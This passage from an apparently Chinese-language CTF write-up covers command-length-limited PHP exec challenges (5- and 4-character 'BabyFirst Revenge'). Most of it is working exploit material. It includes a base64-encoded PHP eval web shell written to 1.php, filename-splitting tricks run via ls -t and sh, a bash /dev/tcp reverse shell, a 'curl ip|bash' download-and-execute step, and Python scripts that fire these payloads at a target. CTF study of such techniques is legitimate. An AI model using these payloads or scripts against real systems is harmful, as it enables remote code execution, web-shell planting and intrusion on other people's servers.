class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;too long&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>利用的思路其实是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[1]);</span><br><span class="line">//或者是post</span><br><span class="line"></span><br><span class="line">base64编码：</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsxXSk7</span><br><span class="line"></span><br><span class="line">只需要执行：</span><br><span class="line">echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</span><br><span class="line">就能将shell写进1.php了</span><br></pre></td></tr></table></figure>
<p>此时通过拆分，并且利用linux的<code>\</code>可以接上换行的特性，可以将命令分解成：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;ech\</span><br><span class="line">&gt;o\ \    //这里空格要加反斜杠</span><br><span class="line">&gt;PD9\</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>由于php的原因，需要双写反斜杠</p>
<p><code>ls -t </code>是按时间倒序写入(越晚的写入越前面)，所以我们需要将其反过来这样写：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//payload.txt</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;1.p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;7\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line"><span class="built_in">ls</span> -t&gt;0</span><br><span class="line">sh 0</span><br></pre></td></tr></table></figure>
<p>脚本执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxxx/?1=&#123;0&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]start attack...&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span> + url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line">        requests.get(url.<span class="built_in">format</span>(i.strip()))</span><br><span class="line"></span><br><span class="line"><span class="comment">#检查是否攻击成功：</span></span><br><span class="line">test = requests.get(<span class="string">&quot;xxx/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]Attack success!&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3><span id="5字符的rce"> 5字符的rce</span></h3>
<p><code>BabyFirst Revenge</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    @<span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>同样的思路，但是我们的<code>ls -t&gt;a</code>长度大于了5，我们此时需要将<code>ls -t&gt;a</code>也写入文件内(我们再写一个sh脚本即可)</p>
<h4><span id="5字符反弹shell"> 5字符反弹shell</span></h4>
<p>利用：</p>
<p>我们将反弹shell的语句放到vps上，然后让靶机curl我们的vps，利用<code>curl ip|bash</code>的方式执行:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vps上:</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>然后vps监听port</p>
<p><code>ls -t&gt;_</code>的写入：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v //将第一个指令，也就是我们的<span class="built_in">dir</span>执行后的结果写入v，此时v的内容应该是 f&gt; ht- sl</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a //调用rev，将v内的内容反转再写入a</span><br><span class="line">sh a //最后利用sh a执行<span class="built_in">ls</span> -th &gt;f</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">sh a</span><br></pre></td></tr></table></figure>
<p>注：这里利用dir是因为dir能够自动补齐空格，方便我们的运算</p>
<p>反弹shell主体：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ip|bash</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;23\\</span><br><span class="line">&gt;4.\\</span><br><span class="line">&gt;9\\</span><br><span class="line">&gt;2.\\</span><br><span class="line">&gt;5\\</span><br><span class="line">&gt;6.\\</span><br><span class="line">&gt;10\\</span><br><span class="line">&gt;\ \\</span><br><span class="line">&gt;rl\\</span><br><span class="line">&gt;cu\\</span><br><span class="line"></span><br><span class="line">//最后sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1 = <span class="string">&quot;xxx/?cmd=&quot;</span></span><br><span class="line">reset = <span class="string">&quot;xxx/?reset=1&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">s.get(reset)</span><br><span class="line"><span class="comment">#写入ls -th&gt;a</span></span><br><span class="line">list1=[</span><br><span class="line">	<span class="string">&quot;&gt;dir&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;f\&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;ht-&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;sl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;*&gt;v&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;rev&quot;</span>,</span><br><span class="line">	<span class="string">&quot;*v&gt;a&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">list2=[</span><br><span class="line">    <span class="string">&quot;&gt;bash&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;\|\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;23\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;4.\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;9\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;2.\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;5\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;6.\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;10\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;\ \\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;rl\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;cu\\&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    url2 = url1+<span class="built_in">str</span>(i)</span><br><span class="line">    s.get(url2)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">    url2 = url1+<span class="built_in">str</span>(j)</span><br><span class="line">    s.get(url2)</span><br><span class="line">s.get(url1+<span class="string">&quot;sh a&quot;</span>)</span><br><span class="line">s.get(url1+<span class="string">&quot;sh f&quot;</span>)</span><br></pre></td></tr></table></figure>
<h4><span id="直接rce"> 直接rce</span></h4>
<p>当然直接rce也是可以的，后面需要做更加多的拆分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&gt;dir</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;a</span><br><span class="line">&gt;hp</span><br><span class="line">&gt;p\\</span><br><span class="line">&gt;1.\\</span><br><span class="line">&gt;\&gt;\\</span><br><span class="line">&gt;64\\</span><br><span class="line">&gt;se\\</span><br><span class="line">&gt;ba\\</span><br><span class="line">&gt;\|\\</span><br><span class="line">&gt;7\\</span><br><span class="line">&gt;Sk\\</span><br><span class="line">&gt;X\\</span><br><span class="line">&gt;x\\</span><br><span class="line">&gt;Fs\\</span><br><span class="line">&gt;FV\\</span><br><span class="line">&gt;d\\</span><br><span class="line">&gt;X0\\</span><br><span class="line">&gt;k\\</span><br><span class="line">&gt;g\\</span><br><span class="line">&gt;bC\\</span><br><span class="line">&gt;h\\</span><br><span class="line">&gt;XZ\\</span><br><span class="line">&gt;gZ\\</span><br><span class="line">&gt;A\\</span><br><span class="line">&gt;aH\\</span><br><span class="line">&gt;w\\</span><br><span class="line">&gt;D9\\</span><br><span class="line">&gt;P\\</span><br><span class="line">&gt;S&#125;\\</span><br><span class="line">&gt;IF\\</span><br><span class="line">&gt;&#123;\\</span><br><span class="line">&gt;\$\\</span><br><span class="line">&gt;o\\</span><br><span class="line">&gt;ch\\</span><br><span class="line">&gt;e\\</span><br><span class="line">sh a</span><br><span class="line">sh f</span><br></pre></td></tr></table></figure>
<p>脚本实现:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;xxxx/?cmd=&#x27;</span></span><br><span class="line">rawurl = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"></span><br><span class="line">attacklist=[</span><br><span class="line">    <span class="string">&quot;&gt;dir&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;f\&gt;&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;ht-&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;sl&quot;</span>,</span><br><span class="line">	<span class="string">&quot;*&gt;v&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;rev&quot;</span>,</span><br><span class="line">	<span class="string">&quot;*v&gt;a&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;hp&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;p\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;1.\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;\&gt;\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;64\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;se\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;ba\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;\|\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;7\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;Sk\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;X\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;x\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;Fs\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;FV\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;d\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;X0\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;k\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;g\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;bC\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;h\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;XZ\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;gZ\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;A\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;aH\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;w\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;D9\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;P\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;S&#125;\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;IF\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;&#123;\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;\$\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;o\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;ch\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;&gt;e\\&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sh a&quot;</span>,</span><br><span class="line">	<span class="string">&quot;sh f&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> attacklist:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]creating &quot;</span> + <span class="built_in">str</span>(i))</span><br><span class="line">    payload = url+<span class="built_in">str</span>(i)</span><br><span class="line">    requests.get(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]testing...&quot;</span>)</span><br><span class="line">test = requests.get(rawurl+<span class="string">&quot;/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]attack success!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!]some error occurred...&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3><span id="4字符rce"> 4字符rce</span></h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;orange&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在上面5字符的时候大概已经知道了*的作用：</p>
<blockquote>
<p>在linux中，输入*会把第一个列出的文件名当作命令，然后把剩下的文件名当作参数</p>
</blockquote>
<p>这就是为什么输入<code>*v&gt;a</code>的时候就会自动将v的内容倒序再写入</p>
<p>因为<code>ls</code>的时候 rev在v的前面</p>
<p>而<code>*v</code>会自动匹配rev 和 v</p>
<p>这就是4字符的rce的关键</p>
<p>直接贴exp了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span>  requests <span class="keyword">as</span> r</span><br><span class="line"><span class="keyword">from</span>  time  <span class="keyword">import</span>  sleep</span><br><span class="line"><span class="keyword">import</span>  random</span><br><span class="line"><span class="keyword">import</span>  hashlib</span><br><span class="line">target  =  <span class="string">&#x27;http://52.197.41.31/&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 存放待下载文件的公网主机的IP</span></span><br><span class="line">shell_ip  =  <span class="string">&#x27;xx.xx.xx.xx&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 本机IP</span></span><br><span class="line">your_ip  =  r.get( <span class="string">&#x27;http://ipv4.icanhazip.com/&#x27;</span> ).text.strip()</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 将shell_IP转换成十六进制</span></span><br><span class="line">ip  =  <span class="string">&#x27;0x&#x27;</span>  +  <span class="string">&#x27;&#x27;</span>.join([ <span class="built_in">str</span> ( <span class="built_in">hex</span> ( <span class="built_in">int</span> (i))[ <span class="number">2</span> :].zfill( <span class="number">2</span> ))</span><br><span class="line">                      <span class="keyword">for</span>  i  <span class="keyword">in</span>  shell_ip.split( <span class="string">&#x27;.&#x27;</span> )])</span><br><span class="line">  </span><br><span class="line">reset  =  target  +  <span class="string">&#x27;?reset&#x27;</span></span><br><span class="line">cmd  =  target  +  <span class="string">&#x27;?cmd=&#x27;</span></span><br><span class="line">sandbox  =  target  +  <span class="string">&#x27;sandbox/&#x27;</span>  +  \</span><br><span class="line">     hashlib.md5( <span class="string">&#x27;orange&#x27;</span>  +  your_ip).hexdigest()  +  <span class="string">&#x27;/&#x27;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># payload某些位置的可选字符</span></span><br><span class="line">pos0  =  random.choice( <span class="string">&#x27;efgh&#x27;</span> )</span><br><span class="line">pos1  =  random.choice( <span class="string">&#x27;hkpq&#x27;</span> )</span><br><span class="line">pos2  =  <span class="string">&#x27;g&#x27;</span>   <span class="comment"># 随意选择字符</span></span><br><span class="line">  </span><br><span class="line">payload  =  [</span><br><span class="line">     <span class="string">&#x27;&gt;dir&#x27;</span> ,</span><br><span class="line">     <span class="comment"># 创建名为 dir 的文件</span></span><br><span class="line">  </span><br><span class="line">     <span class="string">&#x27;&gt;%s\&gt;&#x27;</span>  %  pos0,</span><br><span class="line">     <span class="comment"># 假设pos0选择 f , 创建名为 f&gt; 的文件</span></span><br><span class="line">  </span><br><span class="line">     <span class="string">&#x27;&gt;%st-&#x27;</span>  %  pos1,</span><br><span class="line">     <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line">     <span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line">  </span><br><span class="line">     <span class="string">&#x27;&gt;sl&#x27;</span> ,</span><br><span class="line">     <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line">     <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line">  </span><br><span class="line">     <span class="string">&#x27;*&gt;v&#x27;</span> ,</span><br><span class="line">     <span class="comment"># 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line">     <span class="comment">#  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line">     <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line">  </span><br><span class="line">     <span class="string">&#x27;&gt;rev&#x27;</span> ,</span><br><span class="line">     <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line">  </span><br><span class="line">     <span class="string">&#x27;*v&gt;%s&#x27;</span>  %  pos2,</span><br><span class="line">     <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。</span></span><br><span class="line">     <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line">  </span><br><span class="line">     <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line">     <span 